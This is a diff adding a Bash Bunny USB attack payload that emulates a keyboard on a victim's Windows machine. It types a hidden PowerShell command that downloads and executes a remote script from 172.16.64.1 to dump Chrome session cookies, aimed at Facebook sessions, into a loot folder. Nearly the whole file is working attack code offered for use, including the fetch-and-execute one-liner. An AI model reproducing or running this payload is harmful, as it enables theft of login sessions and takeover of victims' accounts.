@@ -1,0 +1,42 @@
+#!/bin/bash
+#
+# Title:         Facebook session cookies dump
+# Author:        oXis (inspired by illwill)
+# Version:       2.0
+#
+# Dumps the stored session cookies from Chrome browser by downloading a Powershell script
+# then stashes them in /root/udisk/loot/FacebookSession/l
+# Credits to these guys for their powershell scripts:
+# https://github.com/sekirkity/BrowserGather BrowserGather.ps1
+# https://github.com/EmpireProject/Empire    Get-FoxDump.ps1
+# Also credit to illwill for the BrowerCreds payload
+
+#script 
+# Blue..............Running Script
+# White.............Setup RNDIS_ETHERNET
+# Green.............Got Browser Creds
+LED B 200
+source bunny_helpers.sh
+
+# QUACK SET_LANGUAGE gb
+DUCKY_LANG='fr'
+
+LOOTDIR=/root/udisk/loot/FacebookSession
+mkdir -p $LOOTDIR
+
+ATTACKMODE HID
+
+cd /root/udisk/payloads/$SWITCH_POSITION/
+./server.py &
+sleep 1
+
+#Dump Chrome Cookies
+Q GUI r
+Q DELAY 100
+Q STRING "powershell -WindowStyle Hidden \"while(\$true){If(Test-Connection 172.16.64.1 -count 1 -quiet){sleep 2;IEX (New-Object Net.WebClient).DownloadString('http://172.16.64.1:8080/p'); Payload; exit}}\""
+Q ENTER
+
+LED R G B 100
+ATTACKMODE RNDIS_ETHERNET
+
+LED G 100 
